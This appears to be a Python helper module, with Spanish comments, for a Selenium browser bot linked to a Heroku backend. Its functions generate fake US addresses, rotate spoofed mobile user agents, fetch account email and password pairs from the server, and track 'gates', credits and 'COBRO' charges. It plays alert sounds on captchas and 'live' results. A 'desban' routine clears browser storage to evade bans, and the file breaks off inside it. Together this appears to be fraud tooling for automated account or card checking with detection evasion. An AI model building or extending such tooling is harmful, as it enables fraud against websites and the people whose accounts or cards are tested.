import re
import shutil
import sys
import os
import json
import subprocess
from typing import KeysView
import requests
import random, time, string, requests
from datetime import datetime, timedelta
from subprocess import CREATE_NO_WINDOW
import pygame
from seleniumbase import SB
from selenium.webdriver.common.keys import Keys


from PyQt5.QtWidgets import QMessageBox
from PyQt5.QtCore import pyqtSignal
import traceback
import logging

signal_error = pyqtSignal(str)

global urlHeroku
urlHeroku = "https://core-project-7422c7757a48.herokuapp.com/"

def getHeadless(self):
    
    if self.num2 != True:
        headless = True
    else:
        headless = False
    return headless

#|--------------------------------Auxiliar-Functions-----------------------------|

#def getTrafic(sb, target_url):

 #   print("Iniciando obtencion de trafico.")

    # Definir el interceptor de respuestas
 #   def capture_response(response):
        
 #       print('Obteniendo informacion de peticion..')
 #       response_url = response['response']['url']
 #       print(response_url)
        
 #       if target_url.match(response_url):
        
 #           print("Request URL:", response['response']['url'])
 #           print("Response:", response['response']['status'])

 #           try:
 #               body = sb.driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': response['requestId']})
 #               print("Response Body:", body['body'])
 #           except Exception as e:
 #               print(f"Error al obtener el cuerpo de la respuesta: {e}")
        
 #       else:
 #           print('Peticion no matcheada.')

    # Asignar el interceptor a la sesión de Selenium
 #   sb.driver.request_interceptor = capture_response

def generar_direccion_fake():
    # Listas de componentes de la dirección
    calles = [
        "NW 107th Ave", "SW 1st St", "NE 5th Ave", "SE 10th Blvd", "W 12th St",
        "E 8th Ave", "N 20th Rd", "S 15th St", "W 22nd Ave", "N 9th Blvd"
    ]
    
    # Generar el número de la dirección y la calle
    numero = random.randint(1, 9999)
    calle = random.choice(calles)
    
    direccion = f"{numero} {calle}"
    return direccion

def reproducir_sonido(ruta):
    pygame.init()
    pygame.mixer.init()
    sonido = pygame.mixer.Sound(ruta)
    sonido.play()

def detener_sonido():
    pygame.mixer.stop()

def captchaSound():

    url_live = 'https://github.com/worldkrory/WizardDownload/raw/dev/rsc/captcha.mp3'
    soundLive = 'captcha.mp3'

    response = requests.get(url_live)
    # Verificar que la descarga fue exitosa
    if response.status_code == 200:
        # Guardar el contenido en un archivo local
        with open(soundLive, 'wb') as f:
            f.write(response.content)
        # Cerrar el archivo después de guardarlo
        f.close()

    else:
        print(f"No se pudo descargar el archivo. Código de estado: {response.status_code}")

    reproducir_sonido(soundLive)

    return

def soundLive():

    url_live = 'https://github.com/worldkrory/WizardDownload/raw/dev/rsc/check.wav'
    soundLive = 'check.wav'

    response = requests.get(url_live)
    # Verificar que la descarga fue exitosa
    if response.status_code == 200:
        # Guardar el contenido en un archivo local
        with open(soundLive, 'wb') as f:
            f.write(response.content)
        # Cerrar el archivo después de guardarlo
        f.close()

    else:
        print(f"No se pudo descargar el archivo. Código de estado: {response.status_code}")

    os.system(f"start {soundLive}")

    return

def closeChrome(self):
    command = 'wmic process where "name=\'chrome.exe\' and commandline like \'%--remote-debugging-port%\'" get processid'
    command = 'wmic process where "name=\'chrome.exe\' and commandline like \'%--remote-debugging-port%\'" get processid'
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    stdout, stderr = process.communicate()
    
    # Procesar la salida para obtener los IDs de proceso
    for pid in stdout.decode().split():
        if pid.isdigit():
            os.system(f'taskkill /PID {pid} /F')

def closeFox(self):
    command = 'wmic process where "name=\'firefox.exe\' and commandline like \'%--remote-debugging-port%\'" get processid'
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    stdout, stderr = process.communicate()
    
    # Procesar la salida para obtener los IDs de proceso
    for pid in stdout.decode().split():
        if pid.isdigit():
            os.system(f'taskkill /PID {pid} /F')

def openBrowser(choose:int,headless:bool):

    device_presets = {

        'iPhone 14 Pro': {"width": 430, "height": 932, "deviceScaleFactor": 3.0},
        'iPhone 13': {"width": 390, "height": 844, "deviceScaleFactor": 3.0},
        'Samsung Galaxy S21': {"width": 360, "height": 800, "deviceScaleFactor": 2.75},
        'Google Pixel 6': {"width": 412, "height": 915, "deviceScaleFactor": 2.5},
        'OnePlus 9': {"width": 412, "height": 915, "deviceScaleFactor": 2.5},
        'iPad Pro (11-inch)': {"width": 834, "height": 1194, "deviceScaleFactor": 2.0},
        'iPad Air (4th generation)': {"width": 810, "height": 1080, "deviceScaleFactor": 2.0},
        'Samsung Galaxy Tab S8': {"width": 800, "height": 1280, "deviceScaleFactor": 2.0},
        'Xiaomi Mi 11': {"width": 412, "height": 915, "deviceScaleFactor": 2.5},
        'Huawei Mate 40 Pro': {"width": 384, "height": 864, "deviceScaleFactor": 3.0},

    }
    
    devices = {

        "Huawei Mate 40 Pro": [
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/91.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Edg/96.0.1054.34 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Edg/95.0.1020.40 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) OPR/62.0.3193.128 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) OPR/61.0.2254.59977 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/96.0.4664.45 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/95.0.4638.74 Mobile Safari/537.36"
        ],


        "Xiaomi Mi 11": [
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/91.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Edg/96.0.1054.34 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Edg/95.0.1020.40 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) OPR/62.0.3193.128 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) OPR/61.0.2254.59977 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/96.0.4664.45 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/95.0.4638.74 Mobile Safari/537.36"
        ],


        "iPhone 14 Pro": [

            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/128.0.0.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/128.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.5 Mobile/15E148 Safari/604.1"
        ],

        "Samsung Galaxy S21": [

            "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G9910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36"
        ],

        "iPhone 13": [

            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3 Mobile/15E148 Safari/604.1"
        ],

        "Google Pixel 6": [

            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.128 Mobile Safari/537.36"
        ],

        "Windows Compatible User-Agents": [

            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.67 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
        ],

        "OnePlus 9": [

            "Mozilla/5.0 (Linux; Android 11; LE2117) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; LE2117) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; LE2113) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; LE2117) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; LE2113) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; LE2120) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; LE2120) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; LE2117) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; LE2117) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
        ],

        "iPad Pro (11-inch)": [

            "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.7 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1"
        ],

        "iPad Air (4th generation)": [

            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.4 Mobile/15E148 Safari/604.1"
        ],

            "Samsung Galaxy Tab S8": [
            "Mozilla/5.0 (Linux; Android 12; SM-X800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-T860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.172 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-X800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.60 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-T830) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-X800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-X808) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
        ]
    }


    if choose == 0:

        sb = sb(uc=True)

    elif choose == 1:
        
        try:
            
            device_presetsVix = {
            #'iPhone 14 Pro': {"width": 430, "height": 932, "deviceScaleFactor": 3.0},
            #'iPhone 13': {"width": 390, "height": 844, "deviceScaleFactor": 3.0},
            'Samsung Galaxy S21': {"width": 360, "height": 800, "deviceScaleFactor": 2.75},
            'Google Pixel 6': {"width": 412, "height": 915, "deviceScaleFactor": 2.5},
            'OnePlus 9': {"width": 412, "height": 915, "deviceScaleFactor": 2.5},
            #'iPad Pro (11-inch)': {"width": 834, "height": 1194, "deviceScaleFactor": 2.0},
            #'iPad Air (4th generation)': {"width": 810, "height": 1080, "deviceScaleFactor": 2.0},
            #'Samsung Galaxy Tab S8': {"width": 800, "height": 1280, "deviceScaleFactor": 2.0},
            'Xiaomi Mi 11': {"width": 412, "height": 915, "deviceScaleFactor": 2.5},
            'Huawei Mate 40 Pro': {"width": 384, "height": 864, "deviceScaleFactor": 3.0},
            'Samsung Galaxy A52': {"width": 411, "height": 851, "deviceScaleFactor": 2.75},  # Ejemplo de un dispositivo adicional
            'Google Pixel 5': {"width": 393, "height": 851, "deviceScaleFactor": 2.75}  # Ejemplo de un dispositivo adicional
            }

            devicesVix = {
                "Huawei Mate 40 Pro": [
                    "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0 Mobile Safari/537.36"
                ],
                "Xiaomi Mi 11": [
                    "Mozilla/5.0 (Linux; Android 11; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 11; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Mobile Safari/537.36"
                ],
                "Samsung Galaxy S21": [
                    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Mobile Safari/537.36"
                ],
                "Google Pixel 6": [
                    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/91.0 Mobile Safari/537.36"
                ],
                "Samsung Galaxy A52": [
                    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36"
                ],
                "Google Pixel 5": [
                    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Mobile Safari/537.36"
                ],
                "OnePlus 9": [
                    "Mozilla/5.0 (Linux; Android 11; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
                    "Mozilla/5.0 (Linux; Android 11; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Mobile Safari/537.36"
                ],
            }

            # Selección aleatoria del dispositivo y User-Agent correspondiente
            device_name = random.choice(list(device_presetsVix.keys()))
            user_agent = random.choice(devicesVix[device_name])
            #user_agent = random.choice(devices["Windows Compatible User-Agents"])
            device_metrics = device_presetsVix[device_name]

            print(device_name)

            return user_agent, device_metrics

        except Exception as e:
            print('Error al iniciar chromedriver', e)

    elif choose == 2:

        # Selección aleatoria del dispositivo y User-Agent correspondiente
        device_name = random.choice(list(device_presets.keys()))
        user_agent = random.choice(devices[device_name])
        #user_agent = random.choice(devices["Windows Compatible User-Agents"])
        device_metrics = device_presets[device_name]

        print(device_name)

        return user_agent, device_metrics
 
    else:

        sb = sb(uc=True)

    return sb

def get_credits_limit(self):
    credits = 1200
    return credits

def getURLS(self):
    urlHeroku = "https://core-project-7422c7757a48.herokuapp.com/"
    return urlHeroku

def getChecks(self):
    gatesCheck = [True,True,False]
    return gatesCheck

def getAddress():

    zipcodes_usa = [
        "10001", "02801", "30301", "60601", "90001",
        "02101", "19101", "33101", "97201", "94101",
        # ... Puedes agregar más códigos postales si lo deseas
        ]

    zipcode = random.choice(zipcodes_usa)
    
    url  = 'https://api.zippopotam.us/us/' + zipcode
    respuesta = requests.get(url)

    if respuesta.status_code == 200:
        res = respuesta.json()
        state = res["places"][0]["state abbreviation"]
        ciudad = res["places"][0]["place name"]
        direccion = []
        direccion.append(state)
        direccion.append(ciudad)
        return res
    else:
        #print(f"No se pudo obtener información. Código de estado: {respuesta.status_code}")
        return None
    
def crawlerVix(method, vix):

    if method == "GET":
        entry = {"gate": method, "vix": vix}
        response = requests.get(urlHeroku + '//crawlerVix',json=entry)
        if response.status_code == 200:
            data = response.json()
            cuenta = data.get("vix")
            return cuenta
    else:
        entry = {"gate": method, "vix": vix}
        x = requests.put(urlHeroku + '//crawlerVix',json=entry)
        return x

def crawlerLink(method, link):

    if method == "GET":
        entry = {"gate": method, "link": link}
        response = requests.get(urlHeroku + '//crawlerLink',json=entry)
        if response.status_code == 200:
            data = response.json()
            link = data.get("link")
            return link
    else:
        entry = {"gate": method, "link": link}
        x = requests.put(urlHeroku + '//crawlerLink',json=entry)
        return x



def setCuenta(email, password, gate):

    if email == "" and password == "" and gate == "GET":

        entry = {"email": email,"password": password, "gate": gate}
        response = requests.get(urlHeroku + '//crawler',json=entry)

        if response.status_code == 200:
            account_list = response.json()
            random_account = account_list[0]
            return random_account
    
    else:
        entry = {"email": email,"password": password, "gate": gate}
        x = requests.put(urlHeroku + '//crawler',json=entry)
        return x


def check_dead(contador,usuario,clave):
    if (contador%10)==0 or contador == 0:
        entry = {"username": usuario,"password": clave, "gate": 'COBRO'}
        x = requests.put(urlHeroku + '//edit',json=entry)   

def cobro_relive(usuario, clave):
    entry = {"username": usuario,"password": clave, "gate": 'COBRO'}
    x = requests.put(urlHeroku + '//edit',json=entry)   
 
def type_with_delay(sb, selector, text, delay=0.5):

    # Encuentra el campo de entrada
    input_field = sb.find_element(selector)
    input_field.clear()  # Limpia el campo antes de escribir
    for char in text:
        input_field.send_keys(char)  # Escribe cada carácter
        sb.sleep(delay) 

def calcular_digito_verificador(ruc):
    """Calcula el dígito verificador para un RUC de 10 dígitos."""
    # Coeficientes para calcular el dígito verificador
    coeficientes = [6, 5, 4, 3, 2, 7, 6, 5, 4, 3, 2]
    
    suma = sum(int(num) * coef for num, coef in zip(ruc, coeficientes[1:]))
    digito = suma % 11
    if digito == 0:
        return 0
    elif digito == 1:
        return 1
    else:
        return 11 - digito
    
def desban(sb):
    try:

        # Limpiar caché y almacenamiento local
        sb.driver.execute_script("window.localStorage.clear();")
        sb.driver.execute_script("window.sessionStorage.clear();")
